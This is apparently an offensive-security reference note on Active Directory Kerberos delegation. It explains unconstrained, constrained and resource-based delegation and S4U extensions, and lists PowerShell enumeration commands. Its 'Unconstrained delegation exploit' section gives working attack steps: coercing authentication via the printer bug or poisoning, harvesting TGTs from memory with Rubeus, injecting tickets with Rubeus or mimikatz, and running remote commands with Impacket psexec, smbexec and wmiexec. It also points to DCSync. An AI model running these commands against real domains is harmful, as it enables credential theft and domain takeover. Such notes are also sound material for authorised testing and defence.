# Active Directory - Kerberos delegations

### Overview

`Kerberos` is an authentication protocol used within Active Directory that rely
on the use of tickets to identify users and grant access to domain resources.
To do so, `Kerberos` implements two type of tickets, issued by two distinct
services of the `Key Distribution Center (KDC)`:
  - `Ticket-Granting Ticket (TGT)`, obtained from the `Authentication Service
  (AS)`.
  - `service tickets`, obtained from the `Ticket-Granting Service (TGS)`.

A valid `TGT` is necessary in order to request `service tickets`, which in turn
grant access to service accounts (user or machine domain accounts that have a
`ServicePrincipalName (SPN)`).

###### Unconstrained, constrained and resource-based constrained delegations

Three types of delegation are implemented in the (Microsoft Active Directory)
`Kerberos` protocol:
  - `unconstrained delegation`,
  - `constrained delegation`,
  - `resource-based constrained delegation (RBCD)`.

Service accounts that are trusted for `unconstrained delegation`, i.e service
accounts with the `ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag being
positioned in their `User-Account-Control` attribute, can fully act on behalf
of other domain users. `Service tickets` received by such services will contain
a copy of the `TGT` of the user accessing the service. The received `TGTs` can
be extracted from the `LSASS` process of the machine running the service /
receiving the authentication, and further used to authenticate to any domain
resources.

Service accounts that are trusted for `constrained delegation`, i.e service
accounts with a non-empty `msDS-AllowedToDelegateTo` attribute, can impersonate
other domain users to configured services (in the service account 's
`msDS-AllowedToDelegateTo` attribute). `Constrained delegations` are
implemented into the `Kerberos` protocol by Microsoft through the
`Service-for-User-to-Proxy (S4U2proxy)` extension. `S4U2proxy` allows service
accounts to request `service tickets` to the `KDC` (`TGS-REQ`) on behalf of
other users by arbitrarily specifying the name of the user the `service ticket`
should be emitted to. In order to do so, the service account must join, in the
`req-body.additional-tickets` field of the `TGS-REQ` request, a
`service ticket` marked as `forwardable` from the specified user.

The `resource-based constrained delegation`, introduced in Windows
Server 2012, deports the trust to the final resources. Instead of trusting a
service account to impersonate other users to destination services, service
accounts can specifically authorize other services to authenticate using
delegated `service tickets`. The authorized services are identified, by their
`SPN`, in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the
final services. Similarly to `constrained delegation`, the service accessing
the final service will request a `service ticket` to the `KDC` on behalf of a
domain user through a `S4U2proxy` request. Except that in a `resource-based
constrained delegation` scenario, the "proxifying" service can provide a
standard `service ticket` to the `KDC` and thus does not have to be in
possession of a `service ticket` marked as `forwardable` from the specified
user.   

The services a service account can request `S4U2proxy` `service tickets` for
are restricted by the `KDC` to the ones either:
  - *`[constrained delegation]`* configured, using their `SPNs`, in the
  requesting service account's `msDS-AllowedToDelegateTo` attribute.
  - *`[resource-based constrained delegation]`* having in their
  `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute the `SPN` of the
  requesting service.

###### Service-for-User-to-Self (S4U2self)

In order to provide protocol transition, Microsoft implemented the `S4U2self`
extension into the `Kerberos` protocol. This extension makes `Kerberos`
delegation possible for domain users accessing a service through other Windows
authentication protocols, such as the `NT Lan Manager (NTLM)` protocol. As a
`service ticket` is required for `Kerberos` `constrained` and `resource-based
constrained delegation` (both leveraging the `Kerberos` `S4U2proxy` extension),
the `S4U2self` allows a service account to obtain a `service ticket` for itself
of an arbitrarily specified user. The user is specified in the of the
`PA-FOR-USER` field in the `preauthentication data` of the `KRB_TGS_REQ`
request to the `KDC`.

Any service account can request `service tickets` for itself through the
`S4U2self` extension. However, only service accounts configured as being able
to `"use any authentication protocol"`, which correspond to the
`ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag being positioned in the
service accounts' `User-Account-Control` attribute, will receive `service
tickets` marked as `forwardable`.

The `S4U2self` `service tickets` contain, in its `Privilege Attribute
Certificate (PAC)`, the `authorization data` of the requested user and can be
used:

  - to impersonate the user locally on the system executing the service if the
  service account has the `SeTcbPrivilege` privilege on the local system.

  - through a `constrained delegation` to impersonate the user on remote
  services, using subsequent `S4U2proxy` requests, if the `S4U2self`
  `service ticket` is marked as `forwardable`. The `S4U2self` `service ticket`
  can only be used to make `S4U2proxy` requests for the services defined in
  the receiving service account's `msDS-AllowedToDelegateTo` attribute.

  - through a `resource-based constrained delegation` to impersonate the user
  on remote services, using subsequent `S4U2proxy` requests, even if the
  `S4U2self` `service ticket` is **not** marked as `forwardable`. Indeed,
  in a `resource-based constrained delegation` scenario, `S4U2Proxy` requests
  will grant `service tickets` for services even if the `service ticket`
  provided to the `KDC` is non-`forwardable`. The `S4U2self` `service ticket`
  can only be used to make `S4U2proxy` requests for the services that define in
  their `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute the service
  emitting the `S4U2self` `service ticket`.

###### Accounts that cannot be delegated

Domain users can be protected from `Kerberos` delegation by either being:
  - configured as non-delegable (`"Account is sensitive and cannot be
    delegated"`), which correspond to the `ADS_UF_NOT_DELEGATED` flag being
    positioned in a user' `User-Account-Control` attribute.
  - members of the `Protected Users` domain group.

### Identification of domain accounts that can be delegated

The PowerShell cmdlets below list all domain accounts that are not tagged as
non-delegable nor are direct member of the `Protected Users` domain group.

```
Get-ADUser -Filter * -Properties AccountNotDelegated,MemberOf | Where-Object {($_.AccountNotDelegated -eq $False) -and -not ($_.Memberof -match "Protected Users")}
Get-DomainUser -Properties * | Where-Object {-not ($_.useraccountcontrol -match "NOT_DELEGATED") -and -not ($_.memberof -match "Protected Users")} | F
```

The PowerShell script below can be used to list the members of the privileged
domain groups that are delegable (with out the `ADS_UF_NOT_DELEGATED` flag
being set in their `User-Account-Control` attribute nor are direct or indirect
member of the `Protected Users` domain group).

```
# Targeted privileged groups: "Domain Admins" (-512), "Enterprise Admins" (-519), "Administrators" (-544), "Backup Operators" (-551), "DNS Admins" (> 1000), "Print Operators" (-550), "Server Operators" (-549), "Account Operators" (-548), "Schema Admins" (-518)

$Users = Get-ADUser -Filter {AccountNotDelegated -eq $False}
$ProtectedUsers = Get-ADGroupMember -Identity "Protected Users" -Recursive

$DelegableUsers = Compare-Object $Users $ProtectedUsers | Select-Object -Expand InputObject | Sort-Object | Get-Unique

$DomainSID = (Get-ADDomain).DomainSID
$DomainAdminsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::AccountDomainAdminsSid, $DomainSID)
$EnterpriseAdminsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::AccountEnterpriseAdminsSid, $DomainSID)
$AdministratorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $DomainSID)
$BackupOperatorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinBackupOperatorsSid,$DomainSID)
$DnsAdminsSID = (Get-ADGroup -Identity "DnsAdmins").SID
$PrintOperatorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinPrintOperatorsSid,$DomainSID)
$ServerOperatorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinSystemOperatorsSid,$DomainSID)
$AccountOperatorsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::BuiltinAccountOperatorsSid,$DomainSID)
$SchemaAdminsSID = New-Object System.Security.Principal.SecurityIdentifier ([System.Security.Principal.WellKnownSidType]::AccountSchemaAdminsSid,$DomainSID)

$PriviligedUsers = Get-ADGroup -Filter {(SID -eq $DomainAdminsSid) -or (SID -eq $EnterpriseAdminsSID) -or (SID -eq $AdministratorsSID) -or (SID -eq $BackupOperatorsSID) -or (SID -eq $DnsAdminsSID) -or (SID -eq $PrintOperatorsSID) -or (SID -eq $ServerOperatorsSID) -or (SID -eq $AccountOperatorsSID) -or (SID -eq $SchemaAdminsSID)} | Get-ADGroupMember -Recursive | Sort-Object | Get-Unique

$DelegablePriviligedUsers = @()
foreach ($DelegableUser in $DelegableUsers){
  foreach ($PriviligedUser in $PriviligedUsers){
   If ($DelegableUser.SamAccountName -eq $PriviligedUser.SamAccountName) {
      $DelegablePriviligedUsers += $DelegableUser
	}
  }
}

$DelegablePriviligedUsers
```

### Unconstrained delegation exploit

###### Unconstrained delegation service accounts identification

The PowerShell `Active-Directory` module and `Powerview` can be used to
enumerate service accounts trusted for `unconstrained delegation` (accounts
having the `ADS_UF_TRUSTED_FOR_DELEGATION` flag configured in their
`User-Account-Control` attribute).

```
# Computer machine accounts
Get-DomainComputer -Unconstrained
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# User service accounts
Get-DomainUser -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
Get-ADUser -Filter {TrustedForDelegation -eq $True}
Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

###### Kerberos authentication capture

Multiples techniques and procedures may be used to obtain a `Kerberos`
authentication from a remote system or user:
  - `LLMNR` and `NBT-NS` poisoning
  - `DNS` poisoning through a `IPv6` rogue `DHCP` server
  - `MSRPC` `MS-RPRN` `SpoolerService` "printer bug"
  - Through the `Exchange Web Services (EWS)` `API`
  - Remote network share access from a `Microsoft SQL Server (MSSQL)` database
  - `Universal Naming Convention (UNC)` path injection in phishing emails or
  documents on network shares
  - etc.

Refer to the `[ActiveDirectory] NTLM capture and relay` note for more
information on how to conduct these techniques. Note that in order to receive
`Kerberos` authentications, instead of `NTLM` authentications, the
authentication requests must be addressed to a service account (requiring a
`SPN` that can be resolved into an `IP` by the remote system). In the present
case, the `SPN` of the service account trusted for `unconstrained delegation`
must be specified.  

If the `SpoolerService` is exposed on a `Domain Controller`, an authentication
request can be triggered from the `Domain Controller` machine account. As
`Domain Controllers` have the necessary rights to make replication requests
through the `Directory Replication Service API (DRSUAPI)` API, a `TGT` of a
`Domain Controller` machine account can be used to conduct `DCSync` attacks.
Refer to the `[ActiveDirectory] ntds.dit dumping` note for more information on
the `DCSync` attack.

If `Exchange Servers` have not been patched with the `February 2019 Quarterly
Exchange Updates`, the `EWS` `API` can be leveraged to trigger a request from
an `Exchange Server` machine account. With out the patch being applied,
`Exchange Server` machine accounts have, by default, high privileges in the
domain. The `Exchange-AD-Privesc` GitHub repository lists the different attack
paths that leverage an `Exchange Server` machine account to obtain
`Domain Admins` privileges: `https://github.com/gdedrouas/Exchange-AD-Privesc`.

###### TGTs retrieval and usage

The `monitor` module of the `Rubeus` C# utility can be used to extract the
`TGTs` stored in memory (elevated privileges are required on the system).

The `monitor` module will periodically extract all `TGTs` and display any
newly captured `TGTs`.

```
# The TGTs will be extract every 60 seconds by default
Rubeus.exe monitor

Rubeus.exe monitor /interval:<INTERVAL_IN_SECONDS> /filteruser:<USERNAME>
```

The extracted `TGT`, outputted in `base64`, can then be used to request
`service tickets` using the `Rubeus`'s `asktgs` to authenticate to domain
services:

```
# Requests a service ticket for the specified service and directly inject the received service ticket in memory.
Rubeus.exe asktgs /ticket:<TGT_BASE64> /service:<TARGET_SERVICE_SPN> /ptt
```

The extracted `TGT` can also be decoded in the `Kerberos` credential format
(`KRB_CRED`) to be injected into memory using `mimikatz` or `Rubeus`:

```
# Decodes the TGT outputted in base64 by Rubeus (and pasted in a file) to a KRB_CRED format.
cat <TGT_BASE64_FILE_PATH> | tr -d "[:space:]" | base64 --decode > <TGT_KIRBI_FILE_PATH>

# Injects into memory the TGT in a KRB_CRED format.
Rubeus.exe ptt /ticket:<TGT_KIRBI_FILE_PATH>
mimikatz.exe "kerberos::ptt <TGT_KIRBI_FILE_PATH>" exit

# Lists the currently cached Kerberos tickets of the process specified logon session.
klist
```

Alternatively, the `TGT` can be decoded and converted in a `credential cache
(ccache)` format to be used with `Impacket`'s Python utilities. Refer to the
`[Windows] Lateral movements` for more information on how to leverage the
`Impacket` suite for lateral movements in a Windows environment.

```
# Decodes the TGT outputted in base64 by Rubeus (and pasted in a file) to a KRB_CRED format.
cat <TGT_BASE64_FILE_PATH> | tr -d "[:space:]" | base64 --decode > <TGT_KIRBI_FILE_PATH>

# Converts the TGT from KRB_CRED to ccache.
ticket_converter.py  <TGT_KIRBI_FILE_PATH> <TGT_CCACHE_FILE_PATH>

# Usage of the TGT through Impacket's utilities.
export KRB5CCNAME=<TGT_CCACHE_FILE_PATH>

psexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
smbexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
wmiexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
